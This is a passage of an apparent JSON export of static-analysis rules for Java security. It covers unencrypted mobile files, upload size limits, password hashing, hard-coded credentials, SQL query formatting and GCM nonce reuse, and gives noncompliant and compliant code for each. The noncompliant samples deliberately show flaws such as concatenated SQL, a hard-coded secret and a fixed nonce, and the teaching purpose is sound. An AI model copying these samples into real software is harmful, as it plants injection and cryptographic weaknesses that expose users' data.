{\n  FTPSClient ftpsClient = new FTPSClient();\n}\n\nif(implicit) {\n  // implicit mode is considered deprecated but offer the same security than explicit mode\n  SMTPSClient smtpsClient = new SMTPSClient(true);\n}\nelse {\n  SMTPSClient smtpsClient = new SMTPSClient();\n  smtpsClient.connect(\"127.0.0.1\", 25);\n  if (smtpsClient.execTLS()) {\n    // commands\n  }\n}\n</pre>\n<p>Perform HTTP encrypted connections, with <a href=\"https://square.github.io/okhttp/https/\">okhttp</a> library for instance:</p>\n<pre>\nConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)\n  .build();\n</pre>\n<p>The most secure mode for Android WebView is <code>MIXED_CONTENT_NEVER_ALLOW</code>:</p>\n<pre>\nimport android.webkit.WebView\n\nWebView webView = findViewById(R.id.webview)\nwebView.getSettings().setMixedContentMode(MIXED_CONTENT_NEVER_ALLOW);\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data Exposure\n  </a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Documentation</a> - Listeners\n  for your Application Load Balancers </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html\">AWS\n  Documentation</a> - Stream Encryption </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S6300": {
        "name": "Using unencrypted files in mobile applications is security-sensitive",
        "htmlDesc": "<p>Storing files locally is a common task for mobile applications. Files that are stored unencrypted can be read out and modified by an attacker with\nphysical access to the device. Access to sensitive data can be harmful for the user of the application, for example when the device gets stolen.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The file contains sensitive data that could cause harm when leaked. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to password-encrypt local files that contain sensitive information. The class <a\nhref=\"https://developer.android.com/reference/androidx/security/crypto/EncryptedFile\">EncryptedFile</a> can be used to easily encrypt files.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nFiles.write(path, content); // Sensitive\n\nFileOutputStream out = new FileOutputStream(file); // Sensitive\n\nFileWriter fw = new FileWriter(\"outfilename\", false); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString masterKeyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC);\n\nFile file = new File(context.getFilesDir(), \"secret_data\");\nEncryptedFile encryptedFile = EncryptedFile.Builder(\n    file,\n    context,\n    masterKeyAlias,\n    EncryptedFile.FileEncryptionScheme.AES256_GCM_HKDF_4KB\n).build();\n\n// write to the encrypted file\nFileOutputStream encryptedOutputStream = encryptedFile.openFileOutput();\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements\">Mobile AppSec\n  Verification Standard - Data Storage and Privacy Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\">Mobile Top 10 2016 Category M2 - Insecure\n  Data Storage</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S5693": {
        "name": "Allowing requests with excessive content length is security-sensitive",
        "htmlDesc": "<p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in\norder to prevent DoS attacks.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> size limits are not defined for the different resources of the web application. </li>\n  <li> the web application is not protected by <a href=\"https://en.wikipedia.org/wiki/Rate_limiting\">rate limiting</a> features. </li>\n  <li> the web application infrastructure has limited resources. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> For most of the features of an application, it is recommended to limit the size of requests to:\n    <ul>\n      <li> lower or equal to 8mb for file uploads. </li>\n      <li> lower or equal to 2mb for other requests. </li>\n    </ul>  </li>\n</ul>\n<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>\n<h2>Sensitive Code Example</h2>\n<p>With default limit value of 8388608 (8MB).</p>\n<p>A 100 MB file is allowed to be uploaded:</p>\n<pre>\n@Bean(name = \"multipartResolver\")\npublic CommonsMultipartResolver multipartResolver() {\n  CommonsMultipartResolver multipartResolver = new CommonsMultipartResolver();\n  multipartResolver.setMaxUploadSize(104857600); // Sensitive (100MB)\n  return multipartResolver;\n}\n\n@Bean(name = \"multipartResolver\")\npublic CommonsMultipartResolver multipartResolver() {\n  CommonsMultipartResolver multipartResolver = new CommonsMultipartResolver(); // Sensitive, by default if maxUploadSize property is not defined, there is no limit and thus it's insecure\n  return multipartResolver;\n}\n\n@Bean\npublic MultipartConfigElement multipartConfigElement() {\n  MultipartConfigFactory factory = new MultipartConfigFactory(); // Sensitive, no limit by default\n  return factory.createMultipartConfig();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>File upload size is limited to 8 MB:</p>\n<pre>\n@Bean(name = \"multipartResolver\")\npublic CommonsMultipartResolver multipartResolver() {\n  multipartResolver.setMaxUploadSize(8388608); // Compliant (8 MB)\n  return multipartResolver;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html\">Owasp Cheat Sheet</a> - Owasp Denial of Service\n  Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/770\">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S5344": {
        "name": "Passwords should not be stored in plaintext or with a fast hashing algorithm",
        "htmlDesc": "<p>The improper storage of passwords poses a significant security risk to software applications. This vulnerability arises when passwords are stored\nin plaintext or with a fast hashing algorithm. To exploit this vulnerability, an attacker typically requires access to the stored passwords.</p>\n<h2>Why is this an issue?</h2>\n<p>Attackers who would get access to the stored passwords could reuse them without further attacks or with little additional effort.<br> Obtaining the\nplaintext passwords, they could then gain unauthorized access to user accounts, potentially leading to various malicious activities.</p>\n<h3>What is the potential impact?</h3>\n<p>Plaintext or weakly hashed password storage poses a significant security risk to software applications.</p>\n<h4>Unauthorized Access</h4>\n<p>When passwords are stored in plaintext or with weak hashing algorithms, an attacker who gains access to the password database can easily retrieve\nand use the passwords to gain unauthorized access to user accounts. This can lead to various malicious activities, such as unauthorized data access,\nidentity theft, or even financial fraud.</p>\n<h4>Credential Reuse</h4>\n<p>Many users tend to reuse passwords across multiple platforms. If an attacker obtains plaintext or weakly hashed passwords, they can potentially use\nthese credentials to gain unauthorized access to other accounts held by the same user. This can have far-reaching consequences, as sensitive personal\ninformation or critical systems may be compromised.</p>\n<h4>Regulatory Compliance</h4>\n<p>Many industries and jurisdictions have specific regulations and standards to protect user data and ensure its confidentiality. Storing passwords in\nplaintext or with weak hashing algorithms can lead to non-compliance with these regulations, potentially resulting in legal consequences, financial\npenalties, and damage to the reputation of the software application and its developers.</p>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The following code is vulnerable because it uses a legacy digest-based password encoding that is not considered secure.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Autowired\npublic void configureGlobal(AuthenticationManagerBuilder auth, DataSource dataSource) throws Exception {\n  auth.jdbcAuthentication()\n    .dataSource(dataSource)\n    .usersByUsernameQuery(\"SELECT * FROM users WHERE username = ?\")\n    .passwordEncoder(new StandardPasswordEncoder()); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Autowired\npublic void configureGlobal(AuthenticationManagerBuilder auth, DataSource dataSource) throws Exception {\n  auth.jdbcAuthentication()\n    .dataSource(dataSource)\n    .usersByUsernameQuery(\"SELECT * FROM users WHERE username = ?\")\n    .passwordEncoder(new BCryptPasswordEncoder());\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use secure password hashing algorithms</h4>\n<p>In general, you should rely on an algorithm that has no known security vulnerabilities. The MD5 and SHA-1 algorithms should not be used.</p>\n<p>Some algorithms, such as the SHA family functions, are considered strong for some use cases, but are too fast in computation and therefore\nvulnerable to brute force attacks, especially with bruteforce-attack-oriented hardware.</p>\n<p>To protect passwords, it is therefore important to choose modern, slow password-hashing algorithms. The following algorithms are, in order of\nstrength, the most secure password hashing algorithms to date:</p>\n<ol>\n  <li> Argon2 </li>\n  <li> scrypt </li>\n  <li> bcrypt </li>\n  <li> PBKDF2 </li>\n</ol>\n<p>Argon2 should be the best choice, and others should be used when the previous one is not available. For systems that must use FIPS-140-certified\nalgorithms, PBKDF2 should be used.</p>\n<p>Whenever possible, choose the strongest algorithm available. If the algorithm currently used by your system should be upgraded, OWASP documents\npossible upgrade methods here: <a\nhref=\"https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#upgrading-legacy-hashes\">Upgrading Legacy Hashes</a>.</p>\n<p>In the previous example, the <code>BCryptPasswordEncoder</code> is a password hashing function in Java that is designed to be secure and resistant\nto various types of attacks, including brute-force and rainbow table attacks. It is slow, adaptative, and automatically implements a salt.</p>\n<h4>Never store passwords in plaintext</h4>\n<p>A user password should never be stored in plaintext. Instead, a hash should be produced from it using a secure algorithm. When dealing with\npassword storage security, best practices recommend relying on a slow hashing algorithm, that will make brute force attacks more difficult. Using a\nhashing function with adaptable computation and memory complexity also is recommended to be able to increase the security level with time.</p>\n<p>Adding a salt to the digest computation is also recommended to prevent pre-computed table attacks (see rule <a href='/coding_rules#rule_key=java%3AS2053'>S2053</a>).</p>\n<h3>Pitfalls</h3>\n<h4>Pre-hashing passwords</h4>\n<p>As bcrypt has a maximum length input length of 72 bytes for most implementations, some developers may be tempted to pre-hash the password with a\nstronger algorithm before hashing it with bcrypt.</p>\n<p>Pre-hashing passwords with bcrypt is not recommended as it can lead to a specific range of issues. Using a strong salt and a high number of rounds\nis enough to protect the password.</p>\n<p>More information about this can be found here: <a\nhref=\"https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#pre-hashing-passwords-with-bcrypt\">Pre-hashing Passwords with\nBcrypt</a>.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring Framework Security Documentation - <a\n  href=\"https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/crypto/bcrypt/BCryptPasswordEncoder.html\">Class\n  BCryptPasswordEncoder</a> </li>\n  <li> OWASP CheatSheet - <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html\">Password Storage Cheat Sheet</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/256\">CWE-256 - Plaintext Storage of a Password</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/916\">CWE-916 - Use of Password Hash With Insufficient Computational Effort</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S6437": {
        "name": "Credentials should not be hard-coded",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>The consequences vary greatly depending on the situation and the secret-exposed audience. Still, two main scenarios should be considered.</p>\n<h4>Financial loss</h4>\n<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of\nclient applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own\nneed, including in a way that was not expected.</p>\n<p>This additional use of the secret will lead to added costs with the service provider.</p>\n<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected\napplication. This might result in a partial denial of service for all the application’s users.</p>\n<h4>Application’s security downgrade</h4>\n<p>A downgrade can happen when the disclosed secret is used to protect security-sensitive assets or features of the application. Depending on the\naffected asset or feature, the practical impact can range from a sensitive information leak to a complete takeover of the application, its hosting\nserver or another linked component.</p>\n<p>For example, an application that would disclose a secret used to sign user authentication tokens would be at risk of user identity impersonation.\nAn attacker accessing the leaked secret could sign session tokens for arbitrary users and take over their privileges and entitlements.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Analyze recent secret use</strong></p>\n<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will\nallow determining if an attacker took advantage of the leaked secret and to what extent.</p>\n<p>This operation should be part of a global incident response process.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<p>The following code example is noncompliant because it uses a hardcoded secret value.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport org.h2.security.SHA256;\n\nString inputString = \"s3cr37\";\nbyte[] key         = inputString.getBytes();\n\nSHA256.getHMAC(key, message);  // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport org.h2.security.SHA256;\n\nString inputString = System.getenv(\"SECRET\");\nbyte[] key         = inputString.getBytes();\n\nSHA256.getHMAC(key, message);  // Noncompliant\n</pre>\n<h3>How does this work?</h3>\n<p>While the noncompliant code example contains a hard-coded password, the compliant solution retrieves the secret’s value from its environment. This\nallows to have an environment-dependent secret value and avoids storing the password in the source code itself.</p>\n<p>Depending on the application and its underlying infrastructure, how the secret gets added to the environment might change.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> AWS Documentation - <a href=\"https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html\">What is AWS Secrets Manager</a> </li>\n  <li> Azure Documentation - <a href=\"https://learn.microsoft.com/en-us/azure/key-vault/\">Azure Key Vault</a> </li>\n  <li> Google Cloud - <a href=\"https://cloud.google.com/secret-manager/docs\">Secret Manager documentation</a> </li>\n  <li> HashiCorp Developer - <a href=\"https://developer.hashicorp.com/vault/docs\">Vault Documentation</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 - Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 - Category A2 - Broken\n  Authentication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "java:S2077": {
        "name": "Formatting SQL queries is security-sensitive",
        "htmlDesc": "<p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the\nquery. However, this rule doesn’t detect SQL injections (unlike rule <a href='/coding_rules#rule_key=javasecurity%3AS3649'>S3649</a>), the goal is only to highlight complex/formatted queries.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Some parts of the query come from untrusted values (like user inputs). </li>\n  <li> The query is repeated/duplicated in other parts of the code. </li>\n  <li> The application must support different types of relational databases. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html\">parameterized queries, prepared\n  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>\n  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic User getUser(Connection con, String user) throws SQLException {\n\n  Statement stmt1 = null;\n  Statement stmt2 = null;\n  PreparedStatement pstmt;\n  try {\n    stmt1 = con.createStatement();\n    ResultSet rs1 = stmt1.executeQuery(\"GETDATE()\"); // No issue; hardcoded query\n\n    stmt2 = con.createStatement();\n    ResultSet rs2 = stmt2.executeQuery(\"select FNAME, LNAME, SSN \" +\n                 \"from USERS where UNAME=\" + user);  // Sensitive\n\n    pstmt = con.prepareStatement(\"select FNAME, LNAME, SSN \" +\n                 \"from USERS where UNAME=\" + user);  // Sensitive\n    ResultSet rs3 = pstmt.executeQuery();\n\n    //...\n}\n\npublic User getUserHibernate(org.hibernate.Session session, String data) {\n\n  org.hibernate.Query query = session.createQuery(\n            \"FROM students where fname = \" + data);  // Sensitive\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic User getUser(Connection con, String user) throws SQLException {\n\n  Statement stmt1 = null;\n  PreparedStatement pstmt = null;\n  String query = \"select FNAME, LNAME, SSN \" +\n                 \"from USERS where UNAME=?\"\n  try {\n    stmt1 = con.createStatement();\n    ResultSet rs1 = stmt1.executeQuery(\"GETDATE()\");\n\n    pstmt = con.prepareStatement(query);\n    pstmt.setString(1, user);  // Good; PreparedStatements escape their inputs.\n    ResultSet rs2 = pstmt.executeQuery();\n\n    //...\n  }\n}\n\npublic User getUserHibernate(org.hibernate.Session session, String data) {\n\n  org.hibernate.Query query =  session.createQuery(\"FROM students where fname = ?\");\n  query = query.setParameter(0,data);  // Good; Parameter binding escapes all input\n\n  org.hibernate.Query query2 =  session.createQuery(\"FROM students where fname = \" + data); // Sensitive\n  // ...\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/564\">CWE-564 - SQL Injection: Hibernate</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/943\">CWE-943 - Improper Neutralization of Special Elements in Data Query Logic</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ITdGBQ\">CERT, IDS00-J.</a> - Prevent SQL injection </li>\n  <li> Derived from FindSecBugs rules <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA\">Potential SQL/JPQL Injection\n  (JPA)</a>, <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO\">Potential SQL/JDOQL Injection (JDO)</a>, <a\n  href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE\">Potential SQL/HQL Injection (Hibernate)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S6432": {
        "name": "Counter Mode initialization vectors should not be reused",
        "htmlDesc": "<p>When encrypting data using AES-GCM or AES-CCM, it is essential not to reuse the same initialization vector (IV, also called nonce) with a given\nkey. To prevent this, it is recommended to either randomize the IV for each encryption or increment the IV after each encryption.</p>\n<h2>Why is this an issue?</h2>\n<p>When encrypting data using a counter (CTR) derived block cipher mode of operation, it is essential not to reuse the same initialization vector (IV)\nfor a given key. An IV that complies with this requirement is called a \"nonce\" (<strong>n</strong>umber used <strong>once</strong>). Galois/Counter\n(GCM) and Counter with Cipher Block Chaining-Message Authentication Code (CCM) are both derived from counter mode.</p>\n<p>When using AES-GCM or AES-CCM, a given key and IV pair will create a \"keystream\" that is used to encrypt a plaintext (original content) into a\nciphertext (encrypted content.) For any key and IV pair, this keystream is always deterministic. Because of this property, encrypting several\nplaintexts with one key and IV pair can be catastrophic. If an attacker has access to one plaintext and its associated ciphertext, they are able to\ndecrypt everything that was created using the same pair.</p>\n<p>Additionally, IV reuse also drastically decreases the key recovery computational complexity by downgrading it to a simpler polynomial root-finding\nproblem. This means that even without access to a plaintext/ciphertext pair, an attacker may still be able to decrypt all the sensitive data.</p>\n<h3>What is the potential impact?</h3>\n<p>If the encryption that is being used is flawed, attackers might be able to exploit it in several ways. They might be able to decrypt existing\nsensitive data or bypass key protections.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By not using the encryption algorithm correctly, the likelihood that an attacker might be able to recover the original sensitive data drastically\nincreases.</p>\n<h4>Additional attack surface</h4>\n<p>Encrypted values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them. If an\nattacker is able to modify the cleartext of the encrypted message, it might be possible to trigger other vulnerabilities in the code.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<p>The example uses a hardcoded IV as a nonce, which causes AES-CCM to be insecure. To fix it, a nonce is randomly generated instead.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\npublic void encrypt(byte[] key, byte[] ptxt) {\n    byte[] nonce = \"7cVgr5cbdCZV\".getBytes(\"UTF-8\");\n\n    Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    SecretKeySpec keySpec = new SecretKeySpec(key, \"AES\");\n    GCMParameterSpec gcmSpec = new GCMParameterSpec(128, nonce);\n\n    cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\npublic void encrypt(byte[] key, byte[] ptxt) {\n    SecureRandom random = new SecureRandom();\n    byte[] nonce = new byte[12];\n    random.nextBytes(nonce);\n\n    Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    SecretKeySpec keySpec = new SecretKeySpec(key, \"AES\");\n    GCMParameterSpec gcmSpec = new GCMParameterSpec(128, nonce);\n\n    cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>For AES-GCM and AES-CCM, NIST recommends generating a nonce using either a deterministic approach or using a 'Random Bit Generator (RBG)'.</p>\n<h4>Generating nonces using random number generation</h4>\n<p>When using a randomized approach, NIST recommends a nonce of at least 96 bits using a cryptographically secure pseudorandom number generator\n(CSPRNG.) Such a generator can create output with a sufficiently low probability of the same number being output twice (also called a\n<em>collision</em>) for a long time. However, after 2<sup>32</sup> generated numbers for the same key, NIST recommends rotating this key for a new\none. After that amount of generated numbers, the probability of a collision is high enough to be considered insecure.</p>\n<p>The code example above demonstrates how CSPRNGs can be used to generate nonces.</p>\n<p>Be careful to use a random number generator that is sufficiently secure. Default (non-cryptographically secure) RNGs might be more prone to\ncollisions in their output, which is catastrophic for counter-based encryption modes.</p>\n<h4>Deterministically generating nonces</h4>\n<p>One method to prevent the same IV from being used multiple times for the same key is to update the IV in a deterministic way after each encryption.\nThe most straightforward deterministic method for this is a counter.</p>\n<p>The way this works is simple: for any key, the first IV is the number zero. After this IV is used to encrypt something with a key, it is\nincremented for that key (and is now equal to 1). Although this requires additional bookkeeping, it should guarantee that for each encryption key, an\nIV is never repeated.</p>\n<p>For a secure implementation, NIST suggests generating these nonces in two parts: a fixed field and an invocation field. The fixed field should be\nused to identify the device executing the encryption (for example, it could contain a device ID), such that for one key, no two devices can generate\nthe same nonce. The invocation field contains the counter as described above. For a 96-bit nonce, NIST recommends (but does not require) using a\n32-bit fixed field and a 64-bit invocation field. Additional details can be found in the <a\nhref=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf\">NIST Special Publication 800-38D</a>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/323\">CWE-323 - Reusing a Nonce, Key Pair in Encryption</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf\">NIST, SP-800-38A</a> - Recommendation for Block Cipher\n  Modes of Operation </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38c.pdf\">NIST, SP-800-38C</a> - Recommendation for Block Cipher\n  Modes of Operation: The CCM Mode for Authentication and Confidentiality </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf\">NIST, SP-800-38D</a> - Recommendation for Block Cipher\n  Modes of Operation: Galois/Counter Mode (GCM) and GMAC </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S4347": {
        "name": "Secure random number generators should not output predictable values",
